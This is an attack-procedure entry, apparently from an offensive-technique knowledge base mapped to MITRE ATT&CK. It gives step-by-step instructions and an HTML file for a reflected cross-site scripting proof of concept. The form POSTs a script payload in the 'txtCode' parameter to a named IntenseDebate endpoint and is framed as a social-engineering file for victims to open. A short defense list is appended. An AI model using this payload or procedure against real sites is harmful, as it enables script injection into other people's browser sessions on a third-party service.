---
id: 444e4567-e89b-12d3-a456-426614174004
name: Prepare-XSS-Proof-of-Concept-HTML
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.892Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - payload-creation
  - xss
  - html
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: low
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Prepare-XSS-Proof-of-Concept-HTML

## Summary

This procedure crafts a local HTML file containing a form that submits a reflected XSS payload via POST to the vulnerable IntenseDebate endpoint.

## Description

The HTML file automates the submission of the 'txtCode' parameter with an unsanitized JavaScript payload to https://www.intensedebate.com/update/tumblr2/{id}. The site ID from the created site is inserted, enabling execution when loaded by the victim. This is a key social engineering vector for the attack.

## Requirements

1. Site ID from previous step
2. Text editor
3. Basic HTML knowledge

## Defense

Defensive measures and detection strategies:

- Educate users on avoiding unsolicited HTML files
- Scan attachments for malicious scripts

## Objectives

1. Embed XSS payload in form
2. Target specific endpoint with site ID
3. Prepare for local execution

## Instructions

### Step 1: Create HTML Structure

**Context**: Build the form to mimic a legitimate submission.

Open a text editor and create a file named xss.html with content:

```html
<!DOCTYPE html>
<html>
<body>
<form action="https://www.intensedebate.com/update/tumblr2/{id}" method="POST">
<input type="hidden" name="txtCode" value='<script>alert("XSS")</script>'>
<input type="submit" value="Click Me">
</form>
</body>
</html>
```

> Replace {id} with the actual site ID.

### Step 2: Save and Verify

**Context**: Ensure the file is ready.

Save the file locally and open it briefly to check form rendering (do not submit yet).

> Confirm the payload is correctly encoded in the input value.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[payload-creation]]
- [[xss]]
- [[html]]
